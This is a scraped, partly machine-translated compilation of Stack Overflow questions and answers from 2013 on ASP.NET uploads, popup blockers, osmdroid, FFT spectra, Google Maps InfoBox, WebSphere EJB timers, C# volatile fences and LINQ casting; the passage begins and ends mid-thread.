    ValidationExpression="(.*\.jpg)|(.*\.jpeg)|(.*\.JPG)|(.*\.JPEG)"></asp:RegularExpressionValidator>
<asp:RequiredFieldValidator ID="ImageSizeValidator" runat="server" ControlToValidate="SizeDropDownList"
    ErrorMessage="Please select an image size." Display="None"></asp:RequiredFieldValidator>
<asp:RequiredFieldValidator ID="QuantityValidator" runat="server" ControlToValidate="QuantityTextBox"
    ErrorMessage="Please select image quantity." Display="None"></asp:RequiredFieldValidator>
<asp:RegularExpressionValidator ID="QuantityExpressionValidator" runat="server" ControlToValidate="QuantityTextBox"
    Display="None" ErrorMessage="Invalid quantity: please choose 1 to 999." ValidationExpression="^([1-9]|[1-9][0-9]|[1-9][0-9][0-9])$"></asp:RegularExpressionValidator>
<asp:ValidationSummary ID="ValidationSummary1" runat="server" DisplayMode="List"
    HeaderText="Something is missing:" Height="40px" ShowMessageBox="True"
    ShowSummary="False" Width="179px" />
<br />
<div style="width:800px">
    <uc3:Footer ID="Footer1" runat="server" />
</div>
</form> 
```

这是buynow.aspx.cs

```
using System;
using System.Data;
using System.Configuration;
using System.Collections;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Web.UI.HtmlControls;
using System.Text;
using System.Xml; 
using System.Drawing;

public partial class BuyNow : System.Web.UI.Page
{
const string DFText = "Choose a Digital Frame.";

/// <summary>
/// Page_Load
/// </summary>
/// <param name="sender"></param>
/// <param name="e"></param>
protected void Page_Load(object sender, EventArgs e)
{
    Page PP = Page.PreviousPage as ASP.home_aspx;

    if (!IsPostBack)
    {
        ImageInfoCollection ImageInfo = new ImageInfoCollection();
        Session["ImageInfoCollection"] = ImageInfo;
        ResetDefaults();
        FreeShipLabel.Text = "";
        FileUpload1.Focus();
    }
}

/// <summary>
/// AddToCartButton_Click
/// </summary>
/// <param name="sender"></param>
/// <param name="e"></param>
protected void AddToCartButton_Click(object sender, EventArgs e)
{

    ImageInfoCollection Images = (ImageInfoCollection)Session["ImageInfoCollection"];
    if (Images == null) {
        Session["SessionError"] = "No Images on BuyNow->AddToCartButton_Click";
        Response.Redirect("Error.aspx");
    }

    if (Images.Count >= 20)
    {
        lblLimitReached.Text = "Only 20 Images allowed per order...Please place another order";
        lblLimitReached.Visible = true;
        return;
    }
    /// BUG: need to figure out how to handle the Back Button case

    if (DigitalFramesCheckBox.Checked && (DigitalFrameLabel.Text == "" || DigitalFrameLabel.Text == DFText))
        return;

    ImageInfo Image = CreateImageInfoFromPage();
    if (Image == null)
        return;

    Images.InsertData(Image);
    Session["ImageInfoCollection"] = Images;
    ShoppingCartDataSource.Select();

    GridView1.DataBind(); // update the GridView shopping cart
    TotalPriceLabel.Text = "Current Total: " + CalculateCartPrice(Images);
    ResetDefaults();

    if (Images.FreeShipping())
        FreeShipLabel.Text = "Order Qualifies for Free Shipping.";
    else
        FreeShipLabel.Text = "";

    if (Images.Count > 0)
        CheckOutButton.Visible = true;

}

/// <summary>
/// ShoppingCartDataSource_ObjectCreating
/// </summary>
/// <param name="sender"></param>
/// <param name="e"></param>
protected void ShoppingCartDataSource_ObjectCreating(object sender, ObjectDataSourceEventArgs e)
{
    // Code that runs when a new session is started
    ImageInfoCollection Images = (ImageInfoCollection)Session["ImageInfoCollection"];
    if (Images == null) {
        Session["SessionError"] = "No Images on ShoppingCartDataSource_ObjectCreating";
        Response.Redirect("Error.aspx");
    }

    e.ObjectInstance = Images;
}

/// <summary>
/// GridView1_RowDeleting
/// </summary>
/// <param name="sender"></param>
/// <param name="e"></param>
protected void GridView1_RowDeleting(object sender, GridViewDeleteEventArgs e)
{
    ImageInfoCollection Images = (ImageInfoCollection)Session["ImageInfoCollection"];
    if (Images == null)
        return;

    Images.DeleteData(e.RowIndex);
    Session["ImageInfoCollection"] = Images;

    TotalPriceLabel.Text = "Current Total: " + CalculateCartPrice(Images);

    if (Images.FreeShipping())
        FreeShipLabel.Text = "Order Qualifies for Free Shipping.";
    else
        FreeShipLabel.Text = "";

    if (Images.Count == 0)
        CheckOutButton.Visible = false;
}

/// <summary>
/// SizeDropDownList_SelectedIndexChanged
/// </summary>
/// <param name="sender"></param>
/// <param name="e"></param>
protected void SizeDropDownList_SelectedIndexChanged(object sender, EventArgs e)
{
    // read the xml file to determine image size attributes
    int index = SizeDropDownList.SelectedIndex;
    ImageXmlAttributes Attrs = new ImageXmlAttributes(ImageSizeDataSource);
    Attrs.LoadByIndex(index);

    // translate the attributes into controls for the page
    // QuantityListBox.Text = Convert.ToString(Attrs.Quantity);
    if (Attrs.MountingAvailable) {
        MountingCheckBox.Enabled = true;
        MountingPriceLabel.Enabled = true;
        MountingPriceLabel.Text = "$" + Convert.ToString(Attrs.MountingPrice);
    }
    else  {
        MountingCheckBox.Enabled = false;
        MountingCheckBox.Checked = false;
        MountingPriceLabel.Enabled = false;
        MountingPriceLabel.Text = "";
    }

    if (Attrs.DigitalAvailable) {
        DigitalFramesCheckBox.Enabled = true;
        DigitalFrameLabel.Text = "";
    }
    else {
        DigitalFramesCheckBox.Enabled = false;
        DigitalFramesCheckBox.Checked = false;
        DigitalFramePanel.Visible = false;
        DigitalFrameLabel.Text = "";
    }

    if (Attrs.BWAvailable)
        BlackAndWhiteCheckBox.Enabled = true;
    else {
        BlackAndWhiteCheckBox.Enabled = false;
        BlackAndWhiteCheckBox.Checked = false;
    }

    CardPanel.Visible = false;

    if ((SizeDropDownList.Text == "DLCCU1") || (SizeDropDownList.Text == "DLCCU2") || (SizeDropDownList.Text == "DLCCU3"))
    {
        CardPanel.Visible = true;
     }
}

protected void MountingCheckBox_CheckedChanged(object sender, EventArgs e)
{
    if (!MountingCheckBox.Checked)
        MountingPriceLabel.Text = "";
    else {
        // read the xml file to determine image size attributes
        int index = SizeDropDownList.SelectedIndex;
        ImageXmlAttributes Attrs = new ImageXmlAttributes(ImageSizeDataSource);
        Attrs.LoadByIndex(index);
        MountingPriceLabel.Text = "$" + Convert.ToString(Attrs.MountingPrice);
    }
}

/// <summary>
/// PlaceOrderButton_Click
/// </summary>
/// <param name="sender"></param>
/// <param name="e"></param>
protected void PlaceOrderButton_Click(object sender, EventArgs e)
{
    Response.Redirect("~/CustomerInfo.aspx");
}

/// <summary>
/// CreateImageFromPage
/// </summary>
/// <returns></returns>
private ImageInfo CreateImageInfoFromPage()
{
    ImageInfo Image = new ImageInfo( ImageSizeDataSource );
    Image.MyFileUpload = FileUpload1;
    Image.OriginalImageName = FileUpload1.FileName; 
    Image.Mounted = MountingCheckBox.Checked;
    Image.BlackAndWhite = BlackAndWhiteCheckBox.Checked;

    Image.DigitalFrame = DigitalFramesCheckBox.Checked;
    Image.DigitalFrameID = DigitalFrameLabel.Text;

    Image.Quantity = Convert.ToInt32(QuantityTextBox.Text);
    Image.LoadAttributes(SizeDropDownList.SelectedIndex);
    return Image;
}

/// <summary>
/// ResetDefaults
/// </summary>
private void ResetDefaults()
{
    SizeDropDownList.ClearSelection();
    QuantityTextBox.Text = "1";
    MountingCheckBox.Checked = false;
    MountingPriceLabel.Text = "";
    MountingCheckBox.Enabled = true;
    BlackAndWhiteCheckBox.Checked = false;
    BlackAndWhiteCheckBox.Enabled = true;
    DigitalFramesCheckBox.Checked = false;
    DigitalFramesCheckBox.Enabled = true;
    DigitalFramePanel.Visible = false;
    CardPanel.Visible = false;
    CardPanel.Visible = false;
    DigitalFrameLabel.Text = "";
    DigitalFrameLabel.ForeColor = Color.Black;
}

/// <summary>
/// CalculateCartPrice
/// </summary>
/// <param name="Images"></param>
/// <returns></returns>
private static string CalculateCartPrice(ImageInfoCollection Images)
{
    return Images.GetTotalPriceString();
}

protected void DigitalFramesCheckBox_CheckedChanged(object sender, EventArgs e)
{
    TurnOffAllRadioButtons();
    if (DigitalFramesCheckBox.Checked == true) {
        DigitalFramePanel.Visible = true;
        DigitalFrameLabel.Text = DFText;
        DigitalFrameLabel.ForeColor = Color.Red;
        SizeDropDownList.SelectedValue = "DL20U";
        BlackAndWhiteCheckBox.Checked = false;
        BlackAndWhiteCheckBox.Enabled = false;
    }
    else {
        DigitalFramePanel.Visible = false;
        DigitalFrameLabel.ForeColor = Color.Black;
        DigitalFrameLabel.Text = "";
        SizeDropDownList.SelectedValue = "";
        BlackAndWhiteCheckBox.Checked = false;
        BlackAndWhiteCheckBox.Enabled = true;
    }
}

protected void RadioButtonF1_CheckedChanged(object sender, EventArgs e)
{
    SelectRadioButton(RadioButtonF1, e);
}

protected void RadioButtonF2_CheckedChanged(object sender, EventArgs e)
{
    SelectRadioButton(RadioButtonF2, e);
}

protected void RadioButtonF3_CheckedChanged(object sender, EventArgs e)
{
    SelectRadioButton(RadioButtonF3, e);
}

protected void RadioButtonF4_CheckedChanged(object sender, EventArgs e)
{
    SelectRadioButton(RadioButtonF4, e);
}

protected void RadioButtonF5_CheckedChanged(object sender, EventArgs e)
{
    SelectRadioButton(RadioButtonF5, e);
}

protected void RadioButtonF6_CheckedChanged(object sender, EventArgs e)
{
    SelectRadioButton(RadioButtonF6, e);
}

protected void RadioButtonF7_CheckedChanged(object sender, EventArgs e)
{
    SelectRadioButton(RadioButtonF7, e);
}

protected void RadioButtonF8_CheckedChanged(object sender, EventArgs e)
{
    SelectRadioButton(RadioButtonF8, e);
}

protected void RadioButtonF9_CheckedChanged(object sender, EventArgs e)
{
    SelectRadioButton(RadioButtonF9, e);
}

protected void RadioButtonF13_CheckedChanged(object sender, EventArgs e)
{
    SelectRadioButton(RadioButtonF13, e);
}

protected void RadioButton15_CheckedChanged(object sender, EventArgs e)
{
    SelectRadioButton(RadioButtonF15, e);
}

protected void RadioButtonF16_CheckedChanged(object sender, EventArgs e)
{
    SelectRadioButton(RadioButtonF16, e);
}

protected void RadioButtonF17_CheckedChanged(object sender, EventArgs e)
{
    SelectRadioButton(RadioButtonF17, e);
}

protected void RadioButtonF18_CheckedChanged(object sender, EventArgs e)
{
    SelectRadioButton(RadioButtonF18, e);
}

private void SelectRadioButton(RadioButton RB, EventArgs e)
{
    TurnOffAllRadioButtons();
    RB.Checked = true;
    DigitalFrameLabel.Text = RB.ToolTip;
    DigitalFrameLabel.ForeColor = Color.Black;
}

private void TurnOffAllRadioButtons()
{
    RadioButtonF1.Checked = false;
    RadioButtonF2.Checked = false;
    RadioButtonF3.Checked = false;
    RadioButtonF4.Checked = false;
    RadioButtonF5.Checked = false;
    RadioButtonF6.Checked = false;
    RadioButtonF7.Checked = false;
    RadioButtonF8.Checked = false;
    RadioButtonF9.Checked = false;
    RadioButtonF1.Checked = false;
    RadioButtonF13.Checked = false;
    RadioButtonF15.Checked = false;
    RadioButtonF16.Checked = false;
    RadioButtonF17.Checked = false;
    RadioButtonF18.Checked = false;
}

protected void BlackAndWhiteCheckBox_CheckedChanged(object sender, EventArgs e)
{
    if (BlackAndWhiteCheckBox.Checked) {
        DigitalFramesCheckBox.Checked = false;
        DigitalFramesCheckBox.Enabled = false;
    }
    else {
        if ((SizeDropDownList.SelectedValue == "DL20U") || (SizeDropDownList.SelectedValue == ""))
        {
            DigitalFramesCheckBox.Enabled = true;
            DigitalFramesCheckBox.Checked = false;
        }
    }
} 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:32:22.057

以下几行是问题所在：

```
 Images.InsertData(Image);
    Session["ImageInfoCollection"] = Images;
    ShoppingCartDataSource.Select(); 
```

基本上，当图像被上传时，它们被存储在会话对象中。这意味着它会直接进入 Web 服务器 RAM 并停留在那里。这是一个非常糟糕的主意，尤其是对于期望任何类型负载的服务器。顺便说一句，它之所以不好的原因是它会导致 RAM 使用量大幅增加，并且如果 Web 应用程序需要回收（在这种情况下很可能经常发生），那么存储在会话中的所有图像都将丢失。

这需要更改为将图像推送到数据库或磁盘上的临时文件。无论哪种方式，这是如何编码的，这意味着在文件从 Session 移动到磁盘之前，您不会看到任何文件出现在文件系统上。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-01T17:39:28.163

当您使用文件上传之类的控件时，上传的文件将放置在 Web 应用程序服务器上某个位置的临时文件夹中。它的放置位置并不重要，因为 asp.net 为您提供了一个可以使用的对象。例如：

```
<asp:FileUpload ID="FileUpload" runat="server" Height="24px" Style="position: static" Width="255px"  />
<asp:Button ID="Uploadbtn" runat="server" OnClick="Uploadbtn_Click" Style="position: static" Text="Upload" Width="82px" /> 
```

此控件创建典型的上传控件。它有一个浏览按钮和一个上传按钮。当用户单击上传按钮时，您将拥有如下事件方法：

```
Protected Sub Uploadbtn_Click(ByVal sender As Object, ByVal e As System.EventArgs)
   Dim myUploadeObject As HttpPostedFile
   myUploadeObject = Me.FileUpload.PostedFile       
End Sub 
```

HttpPostedFile 对象有一大堆可以访问的方法和属性，例如文件名、输入流、内容类型和长度。

此外，fileUPload 对象本身具有许多有用的属性和方法，例如：HasFile、文件名、文件字节和内容

将它们放在一起，您可以执行以下操作：

```
 Protected Sub Uploadbtn_Click(ByVal sender As Object, ByVal e As System.EventArgs)
    Dim fu As FileUpload
    fu = Me.FileUpload

    If (fu.HasFile = True) Then
        Dim myUploadeObject As HttpPostedFile
        myUploadeObject = Me.FileUpload.PostedFile

        Dim filePath As String = myUploadeObject.FileName
        Dim fileName As String = fu.FileName
        Dim fileBytes As Byte() = fu.FileBytes
        Dim fileContenetType As String = myUploadeObject.ContentType
        Dim inputStream As IO.FileStream = myUploadeObject.InputStream

    Else
        'there was a problem, alert the user
    End If      
End Sub 
```

# javascript - 防止子窗口被弹出窗口拦截器捕获

> ID：15163239
> 
> 赞同：1
> 
> 时间：2013-03-01T17:16:42.030
> 
> 标签：javascript, jquery, parent-child

我有一个功能，点击后，它会通过`$.get()`调用检查一些信息，然后才能知道是否应该打开子窗口。它工作得很好，只是因为打开子窗口的功能不是直接来自点击事件，它会被认为是一个讨厌的不需要的弹出窗口。有谁知道解决方法或向浏览器证明它是一个想要的窗口的方法？谢谢。

```
$('#send').click(function(){

     $.ajaxSetup({cache: false})
     $.get('test3.html',function(data){
   if(data == "processing"){
      alert("still processing");
  }else{
            childPage = window.open("test.html","send","width = 300,height = 300");
         }
     });
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:18:58.097

使用加载屏幕立即弹出窗口（向用户显示正在发生的事情）会更可靠。然后在 ajax 处理程序中，您可以将弹出窗口重定向到正确的页面。

也就是说，弹出窗口通常是一个坏主意。你有没有办法以另一种方式做到这一点？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:22:23.893

我知道我并没有完全回答您想要什么，但我发现这种方式总体上比普通弹出窗口更具吸引力，并且获得了更多控制权。

我说的是使用fancybox 之类的插件，[http://www.fancyapps.com/fancybox/#examples](http://www.fancyapps.com/fancybox/#examples) 女巫允许您嵌入iframe 或您想要的任何其他内容。我很确定加载这样的 iframe 比试图绕过浏览器限制要容易得多。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T17:21:05.383

> 有谁知道解决方法或向浏览器证明它是一个想要的窗口的方法

这将意味着更改浏览器设置，这些设置是为了防止您尝试实现的目标，因此不幸的是，据我所知，没有办法。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T19:01:58.930

您也可以尝试通过标签模拟弹出窗口，而不是打开新的弹出窗口。试试[这个](http://demo.mysamplecode.com/JavaScript/pages/popupBox.jsp)

# android - osmdroid LoggerFactory 错误，重新打开应用程序后

> ID：15163241
> 
> 赞同：0
> 
> 时间：2013-03-01T17:16:56.163
> 
> 标签：android, osmdroid

在我的 osmdroid 项目中，以下错误是我缺少库时发生的错误`slf4j-android-1.5.8.jar`

```
java.lang.NoClassDefFoundError: org.slf4j.LoggerFactory 
```

我添加了那个库，应用程序第一次运行完美。但是当我关闭应用程序并重新打开它时，我再次收到启动错误。

每次我希望应用程序成功打开时，我都必须重新安装应用程序。

编辑：我现在有 slf4j 的 android 特定版本，但这似乎不能解决问题

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T18:09:13.983

我认为您需要的是 sl4fj 的**Android 特定**版本。我使用 slf4j-android-1.5.8.jar 没有问题。有一个稍后发布的候选人。两个罐子都可以从[这个页面下载](http://www.slf4j.org/android/)

# python - 使用 Python 的频谱分析器？

> ID：15163244
> 
> 赞同：-3
> 
> 时间：2013-03-01T17:17:03.793
> 
> 标签：python, audio, fmod, spectrum

我想用 Python 创建一个音乐播放器，它使用 OpenGL 来可视化音频频谱。 ![在此处输入图像描述](../Images/9efd6af5a67d64eaf87277951e1f2b7b.png)

我已经设置了 3d 引擎，我需要的只是获取光谱数据并将其提供给渲染器。我想这将是每几毫秒左右更新一次的数字列表。

我听说您可以使用 FMOD 获取该信息，并且有 pyfmodex Python 包装器，但我无法访问 FMOD 文档并且 pyfmodex 几乎没有文档。仅通过浏览类/函数名称无法找到我需要的内容。如果有另一个图书馆可以获得同样有效的信息。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:42:24.960

numpy 有一个 FFT 函数，可以对输入数据块进行快速傅立叶变换。您可以使用它的输出来获取您的光谱信息。

# javascript - 右键单击信息框不起作用

> ID：15163245
> 
> 赞同：2
> 
> 时间：2013-03-01T17:17:03.820
> 
> 标签：javascript, google-maps-api-3

我有与这篇文章**完全相同的问题**：

[右键单击 Div（信息框）被禁用。如何启用它](https://stackoverflow.com/questions/8633279/rightclicking-on-div-infobox-is-disabled-how-do-i-enable-it)

我使用**Chrome**和**Google 地图 api**，我想通过右键单击它来“检查元素”，但它不起作用。另一篇文章中提出的解决方案不起作用。

你知道为什么吗？

编辑：添加一些代码。

```
var boxText = document.createElement("div");
boxText.id = "infoBoxDiv";
boxText.style.cssText = "margin: 0px;";

var myOptions = {
        content : boxText
        ,disableAutoPan: false
        ,maxWidth: 0
        ,pixelOffset: new google.maps.Size(0, 0)
        ,zIndex: null

        ,boxStyle: { 
            margin : "0px",
            padding : "0px",
            border : "none",
          opacity: 1
          ,width: "420px"
         }
        ,closeBoxMargin: "0px 0px 0px 0px"
        ,closeBoxURL: ""
        ,infoBoxClearance: new google.maps.Size(1, 1)
        ,isHidden: false
        ,pane: "floatPane"
        ,enableEventPropagation: false
};
infowindow = new InfoBox(myOptions); 
```

我使用： infowindow.setContent(stringContent); 设置内容。

您在这里遇到完全相同的问题：http: [//google-maps-utility-library-v3.googlecode.com/svn/trunk/infobox/examples/infobox-basic.html](http://google-maps-utility-library-v3.googlecode.com/svn/trunk/infobox/examples/infobox-basic.html)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:21:54.460

您提到的问题也列出了答案：

```
var infoboxOptions = {
    content: boxText,
    disableAutoPan: true,
    maxWidth: 0,
    pixelOffset: new google.maps.Size(0, 0),
    zIndex: null,
    infoBoxClearance: new google.maps.Size(5, 5),
    closeBoxURL: '',
    isHidden: true,
    pane: "floatPane",
    enableEventPropagation: false,
    contextmenu: true
    }; 
```

您需要进行设置`contextmenu: true`以使其正常工作。

**更新**

尝试添加以下事件。

```
google.maps.event.addListener(map, 'click', function(e) {
                contextmenu:true
            }); 
```

**第二次更新**

问题出在您包含的 Infobox.js 文件中。在此文件中，默认情况下已阻止右键单击或上下文菜单。

如果您查看一个普通的 Google Maps InfoWindow，它会像 exoected 一样工作，您无需为此添加任何额外的代码。看看我下面的带有 Infowindow 的 DEMO 并右键单击按预期工作；

[**右键单击信息窗口演示**](http://jsfiddle.net/refhat/XW35W/2/)

# timer - Websphere EJB3.0 定时器避免持久化

> ID：15163249
> 
> 赞同：0
> 
> 时间：2013-03-01T17:17:10.510
> 
> 标签：timer, persistence, websphere, ejb-3.0

Websphere 7.0、EJB3.0

有没有办法避免默认的 EJB 计时器持久性。看起来计时器在服务器崩溃和重新启动后仍然存在。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-03T08:19:07.547

Java EE 6（WebSphere 8 及更高版本）中添加了非持久 EJB 计时器。

如果您需要 WebSphere 7 中的非持久计时器，您可能需要使用[AlarmManager](http://pic.dhe.ibm.com/infocenter/wasinfo/v7r0/index.jsp?topic=/com.ibm.websphere.javadoc.doc/web/apidocs/com/ibm/websphere/asynchbeans/AlarmManager.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-04T07:40:58.487

EJB-3.0 的首选方法是在服务器关闭/启动时清除所有计时器，以避免计时器因故障而持续存在。

您可以将代码放置在适当的方法中 -`onApplicationEnd`或者`onApplicationStart`通过实现`ApplicationListener`接口，或者您可以参考[这里](http://www-01.ibm.com/support/docview.wss?uid=swg21412991)，但前者更好。

否则，可以运行命令以显式取消计时器，如文档中所述。

> **取消EJBTimers**

```
This command cancels and removes from persistent storage EJB timers based on the specified filter criteria.

The syntax for this command is: cancelEJBTimers server filter [options]    filter: -all | -timer | -app [-mod [-bean ]]
           -all
           -timer timer id
           -app   application name
           -mod   module name
           -bean  bean name

  options: -host  host name
           -port  portnumber
           -conntype connector type
           -user  userid
           -password password
           -quiet
           -logfile filename
           -replacelog
           -trace
           -help 
```

在 EJB-3.1 中，`TimerConfig`您可以使用`setPersistent(isPersistent)`.

# c# - 挥发性围栏演示？

> ID：15163250
> 
> 赞同：6
> 
> 时间：2013-03-01T17:17:19.343
> 
> 标签：c#, .net, multithreading, volatile

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-03-01T17:41:39.923

Making `complete` volatile does two things:

*   It prevents the C# compiler or the jitter from making optimizations that would cache the value of `complete`.

*   It introduces a fence that tells the processor that caching optimizations of other reads and writes that involve either pre-fetching reads or delaying writes need to be de-optimized to ensure consistency.

Let's consider the first. The jitter is perfectly within its rights to see that the body of the loop:

```
 while(!complete) toggle = !toggle; 
```

does not modify `complete` and therefore whatever value `complete` has at the beginning of the loop is the value that it is going to have forever. So the jitter is allowed to generate code as though you'd written

```
 if (!complete) while(true) toggle = !toggle; 
```

or, more likely:

```
 bool local = complete; 
    while(local) toggle = !toggle; 
```

Making `complete` volatile prevents both optimizations.

But what you are looking for is the second effect of volatile. Suppose your two threads are running on different processors. Each has its own processor cache, which is a copy of main memory. Let's suppose that both processors have made a copy of main memory in which `complete` is false. When one processor's cache sets `complete` to true, if `complete` is not volatile then the "toggling" processor is not required to notice that fact; it has its own cache in which `complete` is still false and it would be expensive to go back to main memory every time.

Marking `complete` as volatile eliminates this optimization. How it eliminates it is an implementation detail of the processor. Perhaps on every volatile write the write gets written to main memory and every other processor discards their cache. Or perhaps there is some other strategy. How the processors choose to make it happen is up to the manufacturer.

The point is that any time you make a field volatile and then read or write it, you are massively disrupting the ability of the compiler, the jitter and the processor to optimize your code. Try to not use volatile fields in the first place; use higher-level constructs, and don't share memory between threads.

> I'm trying to visualize the sentence :"An acquire-fence prevents other reads/writes from being moved before the fence..." What instruction should not be before that fence ?

Thinking about instructions is probably counterproductive. Rather than thinking about a bunch of *instructions* just concentrate on the sequence of reads and writes. Everything else is irrelevant.

Suppose you have a block of memory, and part of it is copied to two caches. For performance reasons, you read and write mostly to the caches. Every now and then you re-synchronize the caches with main memory. What effect does this have on a sequence of reads and writes?

Suppose we want this to happen to a single integer variable:

1.  Processor Alpha writes 0 to main memory.
2.  Processor Bravo reads 0 from main memory.
3.  Processor Bravo writes 1 to main memory.
4.  Processor Alpha reads 1 from main memory.

Suppose what really happens is this:

*   Processor Alpha writes 0 to the cache, and synchronizes to main memory.
*   Processor Bravo synchronizes cache from main memory and reads 0.
*   Processor Bravo writes 1 to cache and synchronizes the cache to main memory.
*   Processor Alpha reads 0 -- a stale value -- from its cache.

How is what really happened in any way different from this?

1.  Processor Alpha writes 0 to main memory.
2.  Processor Bravo reads 0 from main memory.
3.  Processor Alpha reads 0 from main memory.
4.  Processor Bravo writes 1 to main memory.

It isn't different. Caching turns "write read write read" into "write read read write". It moves one of the reads backwards in time, and, in this case equivalently, moves one of the writes forwards in time.

This example just involves two reads and two writes to one location, but you can imagine a scenario where there are many reads and many writes to many locations. The processor has wide lattitude to move reads backwards in time and move writes forwards in time. The precise rules for what moves are legal and which are not differ from processor to processor.

A *fence* is a barrier that prevents reads from moving backwards or writes from moving forwards past it. So if we had:

1.  Processor Alpha writes 0 to main memory.
2.  Processor Bravo reads 0 from main memory.
3.  Processor Bravo writes 1 to main memory. FENCE HERE.
4.  Processor Alpha reads 1 from main memory.

No matter what caching strategy a processor uses, it is now not allowed to move read 4 to any point before the fence. Similarly it is not allowed to move write 3 ahead in time to any point after the fence. How a processor implements a fence is up to it.

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-03T02:32:48.630

Like most of my answers pertaining to memory barriers I will use an arrow notation where ↓ represents an acquire-fence (volatile read) and ↑ represents a release-fence (volatile write). Remember, no other read or write can move past an arrow head (though they can move past the tail).

Let us first analyze the writing thread. I will assume that `complete` is declared as `volatile`¹. `Thread.Start`, `Thread.Sleep`, and `Thread.Join` will generate full fences and that is why I have up and down arrows on either side of each of those calls.

```
↑                   // full fence from Thread.Start
t.Start();
↓                   // full fence from Thread.Start
↑                   // full fence from Thread.Sleep
Thread.Sleep(1000);
↓                   // full fence from Thread.Sleep
↑                   // release fence from volatile write to complete
complete = true;
↑                   // full fence from Thread.Join
t.Join();
↓                   // full fence from Thread.Join 
```

One important thing to notice here is that it is the `Thread.Join` call that is preventing the write to `complete` from floating any further down. The effect here is that the write gets committed to main memory immediately. **It is not the volatility of `complete` itself that is causing it to get flushed to main memory. It is the `Thread.Join` call and the memory barrier it generates that is causing that behavior.**

Now we will analyze the reading thread. This is a bit trickier to visualize because of the while loop though, but let us start with this.

```
bool toggle = false;
register1 = complete;
↓                           // half fence from volatile read
while (!register1)
{
  bool register2 = toggle;
  register2 = !register2;
  toggle = register2;
  register1 = complete;
  ↓                         // half fence from volatile read
} 
```

Maybe we can visualize it better if we [unwind the loop](http://en.wikipedia.org/wiki/Loop_unwinding). For brevity I will only show the first 4 iterations.

```
if (!register1) return;
register2 = toggle;
register2 = !register2;
toggle = register2;
register1 = complete;
↓
if (!register1) return;
register2 = toggle;
register2 = !register2;
toggle = register2;
register1 = complete;
↓
if (!register1) return;
register2 = toggle;
register2 = !register2;
toggle = register2;
register1 = complete;
↓
if (!register1) return;
register2 = toggle;
register2 = !register2;
toggle = register2;
register1 = complete;
↓ 
```

Now that we have the loop unwound I think you can see how that any potential movement of the read of `complete` is going to be severely limited.² Yes, it can get shuffled around a little bit by the compiler or hardware, but it is pretty much locked into being read on every iteration. Remember, the read of `complete` is still free to move, but the fence that it created does not move with it. That fence is locked into place. This is what causes the behavior often called a "fresh read". If `volatile` were omitted on `complete` then the compiler would be free to use an optimization technique called "lifting". That is where a read of a memory address can get extracted or lifted outside the loop. In the absence of `volatile` that optimization would be legal because *all* of the reads of `complete` would be allowed to float up (or lifted) until they are all ultimately outside of the loop. At that point the compiler would then coalesce them all into a one-time read just before starting the loop.³

Let me summarize a few important points right now.

*   It is the call to `Thread.Join` that is causing the write to `complete` to get committed to main memory so that the worker thread will eventually pick it up. The volatility of `complete` is irrelevant on the writing thread (which is probably surprising to most).
*   It is the acquire-fence generated by the volatile read of `complete` that is preventing that read from getting lifted outside of the loop which in turn creates the "fresh read" behavior. The volatility of `complete` on the reading thread makes a huge difference (which is probably obvious to most).
*   "Committed writes" and "fresh reads" are not directly caused volatile reads and writes. But, they are indirect consequences which just happen to almost always occur especially in the case of loops.

* * *

¹*Marking `complete` as `volatile` on the writing thread is not necessary because x86 writes already have volatile semantics, but more importantly because the fence that is created by it does not cause the "committed write" behavior anyway.*

²*Keep in mind, that reads and writes can move through the tail of arrow, but the arrow is locked in place. That is why you cannot bubble up all of the reads outside of the loop.*

³*The lifting optimization must also ensure that the actual behavior of the thread is consistent with what the programmer originally intended. That requirement is easy to satisfy in this case because the compiler can easily see that `complete` is never written to on that thread.*

# c# - 我应该投入我的 lambda 还是投入 IEnumerable？

> ID：15163254
> 
> 赞同：10
> 
> 时间：2013-03-01T17:17:29.147
> 
> 标签：c#, linq, casting

在我的项目中，我有一个`MyClass`which implements `IMyClass`。`IMyClass`我需要通过转换其他项目的列表来返回一个列表。为简单起见，假设我可以`MyClass`通过将另一个项目传递给它的构造函数来创建一个，即`new MyClass(item)`.

考虑以下两行，它们（据我所知）产生相同的结果：

```
var option1 = items.Select(item => new MyClass(item)).Cast<IMyClass>().ToList()
var option2 = items.Select(item => new MyClass(item) as IMyClass).ToList() 
```

在我看来，选项 #1 需要双重枚举，一次将所有项目投射到我的界面，一次生成列表。如果我是对的，那么选项#2 会更聪明。但是，我**从未**见过使用选项#2 之类的代码，而且我倾向于认为我不够聪明，无法提出其他 C# 社区没有的聪明方法。

在旁注中，我认为选项＃2 在美学上更令人愉悦，但这只是我。

**我的问题是：**我的选项#2 是否像我认为的那样是一个更好的主意？是否有任何我遗漏的问题或我想坚持使用选项#1 的其他原因？或者，当我完全错过了一个更聪明的第三个想法时，我是否在比较两个愚蠢的想法？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-03-01T17:23:34.993

我会选择选项3：

```
var option3 = items.Select<Foo, IMyClass>(item => new MyClass(item))
                   .ToList() 
```

或者，不要使用`as`而只是正常投射：

```
var option4 = items.Select(item => (IMyClass) new MyClass(item))
                   .ToList() 
```

这两个看起来都比使用`Cast`.

哦，从带有 .NET 4 的 C# 4 开始（由于协变），您可以在`ToList`调用上放置一个类型参数：

```
var option5 = items.Select(item => new MyClass(item))
                   .ToList<IMyClass>() 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-01T17:22:18.573

> 在我看来，选项 #1 需要双重枚举

这不是真的。在这两种情况下，`items`仅当您到达时才会枚举集合`ToList()`。

线

```
var option1 = items.Select(item => new MyClass(item)).Cast<IMyClass>().ToList() 
```

相当于

```
